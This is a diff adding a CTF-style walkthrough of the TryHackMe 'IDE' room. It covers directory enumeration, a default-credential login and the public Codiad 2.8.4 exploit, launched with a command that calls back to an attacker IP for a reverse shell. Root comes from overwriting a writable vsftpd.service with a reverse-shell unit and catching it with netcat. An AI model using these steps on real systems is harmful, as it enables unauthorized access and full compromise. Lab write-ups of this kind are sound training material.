@@ -219,15 +219,173 @@ Lets fire up gobuster again to search for hidden directories
 
 >command: gobuster dir -u http://10.10.101.244:62337 -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
 
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/IDE]
+└─$ gobuster dir -u http://10.10.101.244:62337 -w /usr/share/dirb/wordlists/common.txt -t 16 -x php,txt,html,zip
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.101.244:62337
+[+] Method:                  GET
+[+] Threads:                 16
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Extensions:              php,txt,html,zip
+[+] Timeout:                 10s
+===============================================================
+2023/03/03 11:01:45 Starting gobuster in directory enumeration mode
+===============================================================
+/common.php           (Status: 200) [Size: 0]
+/components           (Status: 301) [Size: 328] [--> http://10.10.101.244:62337/components/]
+/config.php           (Status: 200) [Size: 0]
+/data                 (Status: 301) [Size: 322] [--> http://10.10.101.244:62337/data/]
+/favicon.ico          (Status: 200) [Size: 1150]
+/index.php            (Status: 200) [Size: 5239]
+/index.php            (Status: 200) [Size: 5239]
+/js                   (Status: 301) [Size: 320] [--> http://10.10.101.244:62337/js/]
+/languages            (Status: 301) [Size: 327] [--> http://10.10.101.244:62337/languages/]
+/lib                  (Status: 301) [Size: 321] [--> http://10.10.101.244:62337/lib/]
+/LICENSE.txt          (Status: 200) [Size: 1133]
+/plugins              (Status: 301) [Size: 325] [--> http://10.10.101.244:62337/plugins/]
+/server-status        (Status: 403) [Size: 281]
+/themes               (Status: 301) [Size: 324] [--> http://10.10.101.244:62337/themes/]
+Progress: 23070 / 23075 (99.98%)
+===============================================================
+2023/03/03 11:06:21 Finished
+===============================================================
 
+```
+Now, we found some hidden directories but lets be more particular about the login page. If you recall in our enumeration for port 21 there was a user ```john``` with a default password. What we have to do now is try defaults password for the user “john”. After so many tries a default I found the password.
+
+```username:john```                  ```password: password```
+
+Logging in with those credentials we gained access to the webpage
+
+![image](https://user-images.githubusercontent.com/67879936/222692215-741b9ca1-a1dd-4dfa-a504-3dbe9f78bddd.png)
+
+
+
+
+<h2>Exploitation</h2>
+
+How do we exploit this to gain a reverse shell to our machine???
+
+Going back to our nmap scan on this particular port we can see the website running on the port is running on ```codiad 2.8.4```
+
+![image](https://user-images.githubusercontent.com/67879936/222692539-3e0c0c6a-1204-4206-8801-4f15bbba0e5c.png)
+
+After a little research I found the exploit
+
+![image](https://user-images.githubusercontent.com/67879936/222692621-3267c3f4-3c4b-4df1-b27a-b3eb77e977dd.png)
+
+Link to exploit: https://www.exploit-db.com/exploits/49705
+
+Lets download the exploit to our machine, then we run it
+
+>command: python3 49705.py http://10.10.101.244:62337/ john password 10.18.1.243 1234 linux
   
-  
-  
-  
-  
-  
-  
-  
+![image](https://user-images.githubusercontent.com/67879936/222694342-84bb0a19-9c11-45ff-9657-58f5cf45c14f.png)
+
+Before answering with ```Y``` we have to run those 2 commands on 2 different terminals
+
+![image](https://user-images.githubusercontent.com/67879936/222694544-2e835584-e8c9-4007-b6df-7bcc2f5a44d3.png)
+
+![image](https://user-images.githubusercontent.com/67879936/222694586-d69cbfb3-440d-4014-84c2-7dabdf0e77f3.png)
+
+After running those 2 commands on 2 different terminals we can then proceed with the exploitation (Your input should be Y)
+
+![image](https://user-images.githubusercontent.com/67879936/222694881-5d125e29-714b-4814-8e64-bf541315a954.png)
+
+Now, going to the other 2 terminals we should have gotten a reverse shell
+
+![image](https://user-images.githubusercontent.com/67879936/222695051-20180354-5cd3-43d3-891f-ca642496a757.png)
+
+![image](https://user-images.githubusercontent.com/67879936/222695092-5c7e3f5c-7ac9-4bc2-a24c-c2bd793e2b71.png)
+
+Yes, we got a reverse shell as user “www-data”.
+
+We can stabilize this shell using the following command
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=screen
+```
+![image](https://user-images.githubusercontent.com/67879936/222695384-01ff6569-b8e5-4aea-b3e1-658516807554.png)
+
+
+
+<h2>Privilege Escalation</h2>
+
+Going to _/home/drac_ directory, lets try to read the ```.bash_history``` file
+
+![image](https://user-images.githubusercontent.com/67879936/222695986-4efaa87d-5a65-4f47-b102-e7fc21486196.png)
+
+Reading the ```.bash_history``` file gives us the password for the user ```drac```. Lets go ahead and switch the user to ```drac```.
+
+checking sudo permissions
+
+>command: sudo -l
+
+![image](https://user-images.githubusercontent.com/67879936/222696347-b38faeea-84d1-411c-ba3a-41d90fb7d7b8.png)
+
+This means we can run the ```/usr/sbin/service``` with sudo privileges
+
+Now, lets send the Linux local Privilege Escalation Awesome Script (linPEAS) from our machine to the target’s machine, and run it on the target’s machine.
+
+To use linPEAS you can read more about it here: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+After running linPEAS, something interesting pops up
+
+![image](https://user-images.githubusercontent.com/67879936/222696672-7fdd4582-5257-42ed-aa9e-7cbb654a45b1.png)
+
+What this means is that we can write to the ```vsftpd.service``` file. Lets head over to the directory to view the content of ```vsftpd.service```
+
+![image](https://user-images.githubusercontent.com/67879936/222697104-fc3a965b-f208-46cd-ab7c-1840b9b4c5df.png)
+
+Since we can write to this file, lets modify it and add a reverse shell there. So, we will create a ```vsftpd.service``` file on our machine and send it to the target’s machine so it can overwrite the previous ```vsftpd.service``` file
+
+![image](https://user-images.githubusercontent.com/67879936/222697575-9a2b7e2c-e87d-4094-b092-c5bcb8feacce.png)
+
+This will be the content of the ```vsftpd.service``` file we will be sending over to the target.
+
+![image](https://user-images.githubusercontent.com/67879936/222697667-7e68c5fe-2c23-43d3-8397-5d461e75f8d8.png)
+
+
+Now that we have the file in our target’s machine lets overwrite the previous file
+
+command used: cp vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service
+
+Lets go back to that directory to check if we’ve truly changed the content of the file
+
+![image](https://user-images.githubusercontent.com/67879936/222697989-d2d6c5ef-8116-4078-8f1b-c64cc99df7a2.png)
+
+Alright, so we’ve successfully changed the content of the ```vsftpd.service``` file. What’s left to do now is to setup our netcat listener so we can listen for incoming connections
+
+>rlwarap nc -lvnp 4444
+
+Now, lets run the file
+
+```
+sudo /usr/sbin/service vsftpd restart
+systemctl daemon-reload
+sudo /usr/sbin/service vsftpd restart
+```
+![image](https://user-images.githubusercontent.com/67879936/222698433-59777ccc-ea2a-4f54-b2d1-f748e639751b.png)
+
+Going over to our netcat listener
+
+![image](https://user-images.githubusercontent.com/67879936/222698493-9f065dc0-7187-42bd-9ff9-0806830b9389.png)
+
+Boom!!! We got shell as the root user
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
+
   
   
 
